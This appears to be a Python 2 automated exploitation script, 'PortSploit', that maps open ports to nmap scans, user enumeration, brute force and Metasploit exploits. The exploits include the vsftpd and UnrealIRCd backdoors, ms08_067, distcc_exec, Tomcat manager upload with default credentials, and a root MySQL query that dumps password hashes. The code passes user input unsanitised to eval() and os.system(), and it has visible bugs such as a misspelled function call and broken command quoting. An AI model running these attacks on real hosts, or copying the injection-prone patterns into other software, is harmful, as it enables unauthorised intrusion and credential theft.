##Created by: Kyhle Ohlinger
#Available: https://github.com/KyhleOhlinger/PentestScripts/

## ABOUT:
#PortSploit is an automated exploitation tool that can be used during a web application and infrastructure penetration tests to determine the exploitable ports for a given IP.

#This will be useful when attempting to determine which ports are succeptible to specific attacks on a given port.

## FEATURES:
#Automatically reads in the openPorts.txt file generated by nslookup.py and attempts to exploit the given ports
#Upon receiving user input, the program automatically attempts to exploit the given ports

## USAGE:
#python portSploit.py --exploit 
	# Runs the script against the given IP and Ports using openPorts.txt generated by nslookup.py
#python portSpolit.py --user
	# Runs the script against an IP and ports supplied by the user

## NOTE:
#The test cases included within the L4L scripts are non-exhaustive and should only be used as building blocks during penetration assessments.

#Imports 
from template import *

#Version Information and basic initialization
global VERSION
global DIRECTORY
global FILENAME
global TargetIP
global initialURL
global SCANS
global TargetScan
global output
global ip_dict
global USER_FILE
global SNMP_FILE

USER_FILE = "/media/sf_Shared/Scripts/L4L/wordlists/users.txt"
SNMP_FILE = "/media/sf_Shared/Scripts/L4L/wordlists/snmp.txt"
VERSION = 1.0
SCANS = ['--exploit','--user','--help']

#==============================================Basic Information=========================================

def basicInformation():
	print bcolors.WARNING + "-- --=[Llama's 4 Lyf"
	print bcolors.WARNING + "-- --=[https://github.com/KyhleOhlinger/PentestScripts/" + bcolors.ENDC
	print bcolors.WARNING + "-- --=[L4L v"+str(VERSION)+" by Kyhle Ohlinger" + bcolors.ENDC
	print bcolors.WARNING + "-- --=[Usage: "
	print ""

	for scans in SCANS:
		print "[*] python nslookup.py " + scans
	print ""

#===========================================Function Definitions========================================
#Running bash commands
def commands(command): 	
	os.system(command)

#Help Options
def showHelp():
	print bcolors.OKGREEN + "-- -------------------=[Retrieving Help Information... ]=---------------- --" + bcolors.ENDC 
	print ""
	print bcolors.OKGREEN + "--exploit: "+bcolors.ENDC
	print bcolors.WARNING + "\t-- --=[Exploits all IP's and Ports specified within openPorts.txt... " + bcolors.ENDC
	print ""

	print bcolors.OKGREEN + "--user: "+bcolors.ENDC
	print bcolors.WARNING + "\t-- --=[Accepts user input and attempts to exploit the ports supplied through user input... " + bcolors.ENDC
	print ""

	print sys.exit()

def main():
	global SCANS
	scan = ' '.join(sys.argv[1:])
	if not scan in SCANS:
		print bcolors.OKRED + "-- --=[For more information use the --help command: python nslookup.py --help " + bcolors.ENDC
		print ""		
		sys.exit()
	elif scan == "--help":
			showHelp()
	else:
		global TargetScan 
		TargetScan = scan

def availableScans():
	global TargetScan
	if TargetScan == "--exploit":
		portList()
	elif TargetScan == "--user":
		singlePort()	
		
def initialize():
	print ""
	global TargetScan	
	L4L()
	basicInformation()
	main()
	if TargetScan == "--exploit":
		retrieveFileInfo()
	availableScans()
	endArt()

#======================================Retrieve target port information===================================
#Either give host and ports or give file as in nslookup.py
def retrieveFileInfo():
	global DIRECTORY
	temp = raw_input(bcolors.WARNING + "-- --=[Please provide the path to openPorts.txt: e.g. /root/home/test/ "+bcolors.ENDC)
	DIRECTORY = temp

def singlePort():
	TARGET = raw_input(bcolors.WARNING + "-- --=[Please provide the IP Address: "+bcolors.ENDC)
	stopCond = ""
	print bcolors.OKGREEN + "-- -------------------=[Attempting to exploit ports on "+TARGET+"... ]=---------------- --" + bcolors.ENDC 
	print ""
	while stopCond != "stop":
		PORT = raw_input(bcolors.WARNING + "-- --=[Please provide the Port: "+bcolors.ENDC)
		mystr = "port"+PORT+"('"+TARGET+"')"
		try:
			print bcolors.OKGREEN + "-- --=[Attempting to exploit port "+PORT+"..." + bcolors.ENDC 
			print ""
			result = eval(mystr) 
		except NameError:
			print bcolors.OKRED + "-- --=[No exploit available for port "+PORT + bcolors.ENDC
			print ""
		stopCond=raw_input(bcolors.WARNING + "-- --=[Type 'stop' to quit or any key to continue: "+bcolors.ENDC)
	
def portList():
	global ip_dict, DIRECTORY
	commands("grep 'open' "+DIRECTORY+"/openPorts.txt | awk '{print $4 , $6}'| sort | uniq > "+DIRECTORY+"/portResults.txt")
	print bcolors.OKGREEN + "-- --=[Generating a list of IP's with related open ports..."+bcolors.ENDC
	print "\n"	
	
	ip_dict = dict()
	with open(""+DIRECTORY+"/portResults.txt", "r") as f:
		searchlines = f.readlines()
		for i, line in enumerate(searchlines):
			currIP = line.split(" ",1)[1]
			currIP = currIP.strip()
			port = line.split(" ",1)[0]
			if currIP in ip_dict:
				ip_dict[currIP].append(port)
			else:
				ip_dict[currIP] = [port]

	myStr=""
	for ip in ip_dict:
		print bcolors.OKGREEN + "-- -------------------=[Attempting to exploit ports on "+ip+"... ]=---------------- --" + bcolors.ENDC 
		print ""
		count =0
		for x in ip_dict[ip]:
			port = ip_dict[ip][count].split("/tcp",1)[0]
			count+=1
			myStr = "port"+port+"('"+ip+"')"
			try:
				print bcolors.OKGREEN + "-- --=[Attempting to exploit port "+port+"..." + bcolors.ENDC 
				print ""
				result=eval(myStr)
			except NameError:
				print bcolors.OKRED + "-- --=[No exploit available for port "+port+"..."+bcolors.ENDC
				print ""
			myStr=""

	os.remove(""+DIRECTORY+"/portResults.txt")
#======================================Port Exploitation Functions========================================
def port21(TARGET):
	commands("nmap -A -sV -Pn -sC -T5 -p 21 --script=ftp-*"+ TARGET+"")
	commands("msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOST '"+TARGET+"'; setg RHOSTS '"+TARGET+"'; run; use unix/ftp/proftpd_133c_backdoor; run; exit;'")

def port22(TARGET):
	commanads("msfconsole -x 'use scanner/ssh/ssh_enumusers; setg USER_FILE '"+USER_FILE+"'; setg RHOSTS '"+TARGET+"' setg RHOST '"+TARGET+"'; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;")

def port23(TARGET):
	commands("cisco-torch -A "+TARGET+"")
	commands("nmap -A -sV -Pn -T5 --script=telnet* -p 23 "+TARGET+"")
	commands("msfconsole -x 'use scanner/telnet/lantronix_telnet_password; setg RHOSTS '"+TARGET+"'; setg RHOST '"+TARGET+"'; run; use scanner/telnet/lantronix_telnet_version; run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run; exit;")

def port25(TARGET):
	commands("nmap -A -sV -Pn -T5 --script=smtp* -p 25 "+TARGET+"")
	commands("smtp-user-enum -M VRFY -U "+USER_FILE+" -t "+TARGET+"")
	commands("msfconsole -x 'use scanner/smtp/smtp_enum; setg RHOSTS '"+TARGET+"'; setg RHOST '"+TARGET+"'; run; exit;")

def port53(TARGET):
	commands("nmap -A -sU -sV -Pn -T5 --script=dns* -p U:53,T:53 "+TARGET+"")	
 
def port79(TARGET):
	commands("nmap -A -sV -Pn -T5 --script=finger* -p 79 "+TARGET+"")
	commands("bin/fingertool.sh "+TARGET+" "+USER_FILE+"")

def port110(TARGET):
	commands("nmap -A -sV  -T5 --script=pop* -p 110 "+TARGET+"")

def port111(TARGET):
	commands("showmount -a "+TARGET+"")
	commands("showmount -d "+TARGET+"")
	commands("showmount -e "+TARGET+"")

def port135(TARGET):
	commands("rpcinfo -p "+TARGET+"")
	commands("nmap -A -p 135 -T5 --script=rpc* "+TARGET+"")
 
def port139(TARGET):
	commands("enum4linux "+TARGET+"")
	commands("nbtscan "+TARGET+"")
	commands("nmap -A -sV  -T5 -p139 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smbv2-enabled --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 "+TARGET+"")
	commands("msfconsole -x 'use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS '"+TARGET+"'; setg RHOST '"+TARGET+"'; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; exit;'")

def port161(TARGET):
	with open(SNMP_FILE) as f:
		for line in f:
			commands("snmpwalk "+TARGET+" -c "+line+"; done;")
	commands("nmap -sU -p 161 --script=snmp* "+TARGET+"")

def port162(TARGET):
	with open(SNMP_FILE) as f:
		for line in f:
			commands("snmpwalk "+TARGET+" -c "+line+"; done;")
	commands("nmap -A -p 162 -Pn --script=snmp* "+TARGET+"")

def port389(TARGET):
	commands("nmap -A -p 389 -Pn -T5 --script=ldap* "+TARGET+"")

def port445(TARGET):
	commands("enum4linux "+TARGET+"")
	commands("nbtscan "+TARGET+"")
	commands("nmap -A -sV -Pn -T5 -p445 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smbv2-enabled --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 "+TARGET+"")
	commands("msfconsole -x 'use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS '"+TARGET+"'; setg RHOST '"+TARGET+"'; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; exit;'")

def port512(TARGET):
	commands("nmap -A -sV -Pn -T5 -p 512 --script=rexec* "+TARGET+"")

def port513(TARGET):
	commands("nmap -A -sV -T5 -Pn -p 513 --script=rlogin* "+TARGET+"")

def port514(TARGET):
	commands("amap "+TARGET+" 514 -A")

def port623(TARGET):
	commands("amap "+TARGET+" 623 -A")
	commands("nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 623 "+TARGET+"")

def port624(TARGET):
	commands("amap "+TARGET+" 624 -A")
	commands("nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 624 "+TARGET+"")

def port1099(TARGET):
	commands("amap "+TARGET+" 1099 -A")
	commands("nmap -A -sV -Pn -T5 -p 1099 --script=rmi-* "+TARGET+"")
	commands("msfconsole -x 'use gather/java_rmi_registry; set RHOST '"+TARGET+"'; run;'")

def port1433(TARGET):
	commands("nmap -A -sV -Pn -T5 --script=ms-sql* -p 1433 "+TARGET+"")

def port1524(TARGET):
	commands("telnet "+TARGET+" 1524")

def port2049(TARGET):
	commands("nmap -A -sV -Pn -T5 --script=nfs* -p 2049 "+TARGET+"")
	commands("rpcinfo -p "+TARGET+"")
	commands("showmount -e "+TARGET+"")
	commands("smbclient -L "+TARGET+" -U ' '%' '")

def port2121(TARGET):
	commands("nmap -A -sV -Pn -T5 --script=ftp* -p 2121 "+TARGET+"")
	commands("msfconsole -x 'setg PORT 2121; use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOSTS '"+TARGET+"'; setg RHOST '"+TARGET+"'; run; use unix/ftp/proftpd_133c_backdoor; run; exit;'")

def port3306(TARGET):
	commands("nmap -A -sV -Pn --script=mysql* -p 3306 "+TARGET+"")
	commands("mysql -u root -h "+TARGET+" -e 'SHOW DATABASES; SELECT Host,User,Password FROM mysql.user;'")

def port3310(TARGET):
	commands("nmap -A -p 3310 -Pn -T5 -sV  --script clamav-exec "+TARGET+"")

def port3128(TARGET):
	commands("nmap -A -p 3128 -Pn -T5 -sV  --script=*proxy* "+TARGET+"")

def port3389(TARGET):
	commands("nmap -A -sV -Pn -T5 --script=rdp-* -p 3389 "+TARGET+"")
	commands("rdesktop "+TARGET+" &")

def port3632(TARGET):
	commands("nmap -A -sV -Pn -T5 --script=distcc-* -p 3632 "+TARGET+"")
	commands("msfconsole -x 'setg RHOST '"+TARGET+"'; setg RHOSTS '"+TARGET+"'; setg RHOST '"+TARGET+"'; use unix/misc/distcc_exec; run; exit;'")

def port4443(TARGET):
	commands("wafw00f http://"+TARGET+":4443")
	commands("sslscan --no-failed "+TARGET+":4443")
	commands("sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers "+TARGET+":4443")
	commands("nikto -h https://"+TARGET+":4443") 
	commands("nmap -sV -Pn -A -p 4443 -T5 --script=*proxy* "+TARGET+"")

def port5432(TARGET):
	commands("nmap -A -sV -Pn --script=pgsql-brute -p 5432 "+TARGET+"")

def port5800(TARGET):
	commands("nmap -A -sV -Pn -T5 --script=vnc* -p 5800 "+TARGET+"")

def port5900(TARGET):
	commands("nmap -A -sV  -T5 --script=vnc* -p 5900 "+TARGET+"")

def port5984(TARGET):
	commands("nmap -A -sV -Pn -T5 --script=couchdb* -p 5984 "+TARGET+"")
	commands("msfconsole -x 'use auxiliary/scanner/couchdb/couchdb_enum; set RHOST '"+TARGET+"'; run; exit;'")

def port6000(TARGET):
	commands("nmap -A -sV -Pn -T5 --script=x11* -p 6000 "+TARGET+"")
	commands("msfconsole -x 'use auxiliary/scanner/x11/open_x11; set RHOSTS '"+TARGET+"'; exploit;'")

def port6667(TARGET):
	commands("nmap -A -sV -Pn -T5 --script=irc* -p 6667 "+TARGET+"")
	commands("msfconsole -x 'use unix/irc/unreal_ircd_3281_backdoor; setg RHOST '"+TARGET+"'; setg RHOSTS '"+TARGET+"'; run; exit;'")

def port8000(TARGET):
	commands("wafw00f http://"+TARGET+":8000")
	commands("nikto -h http://"+TARGET+":8000 ")
	commands("nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8000 -T5 "+TARGET+"")

def port8100(TARGET):
	commands("wafw00f http://"+TARGET+":8100")
	commands("sslscan --no-failed "+TARGET+":8100")
	commands("nikto -h http://"+TARGET+":8100")
	commands("nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8100 -T5 "+TARGET+"")

def port8080(TARGET):
	commands("wafw00f http://"+TARGET+":8080")
	commands("sslscan --no-failed "+TARGET+":8080")
	commands("nikto -h http://"+TARGET+":8080") 
	commands("nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8080 -T5 --script=*proxy* "+TARGET+"")
	commands("msfconsole -x 'use admin/http/jboss_bshdeployer; setg RHOST '"+TARGET+"'; run; use admin/http/tomcat_administration; setg RHOSTS '"+TARGET+"'; setg RHOST '"+TARGET+"'; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;'")

def port8180(TARGET):
	commands("wafw00f http://"+TARGET+":8180")
	commands("sslscan --no-failed "+TARGET+":8180")
	commands("sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers "+TARGET+":8180")
	commands("nikto -h http://"+TARGET+":8180")
	commands("nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -p 8180 -T5 --script=*proxy* "+TARGET+"")
	commands("msfconsole -x 'use admin/http/tomcat_administration; setg RHOSTS '"+TARGET+"'; setg RHOST '"+TARGET+"'; setg RPORT 8180; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;'")

def port8443(TARGET):
	commands("wafw00f http://"+TARGET+":8443")
	commands("sslscan --no-failed "+TARGET+":8443")
	commands("sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers "+TARGET+":8443")
	commands("nikto -h https://"+TARGET+":8443") 
	commands("nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8443 -T5 --script=*proxy* "+TARGET+"")

def port8888(TARGET):
	commands("wafw00f http://"+TARGET+":8888")
	commands("nikto -h http://"+TARGET+":8888") 
	commands("nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse  -A -p 8888 -T5 "+TARGET+"")

def port10000(TARGET):
	commands("msfconsole -x 'use auxiliary/admin/webmin/file_disclosure; setg RHOST '"+TARGET+"'; setg RHOSTS '"+TARGET+"'; run; exit;'")

def port16992(TARGET):
	commands("amap "+TARGET+" 16992 -A")
	commands("nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 16992 "+TARGET+"")

def port27017(TARGET):
	commands("nmap -sV -p 27017 -Pn -T5 --script=mongodb* "+TARGET+"")

def port27018(TARGET):
	commands("nmap -sV  -p 27018 -Pn -T5 --script=mongodb* "+TARGET+"")

def port27019(TARGET):
	commands("nmap -sV  -p 27019 -Pn -T5 --script=mongodb* "+TARGET+"")

def port28017(TARGET):
	commands("nmap -sV  -p 28017 -Pn -T5 --script=mongodb* "+TARGET+"")

#=============================================Running The Script=========================================
initialize()
#==============================================That's All Folks==========================================

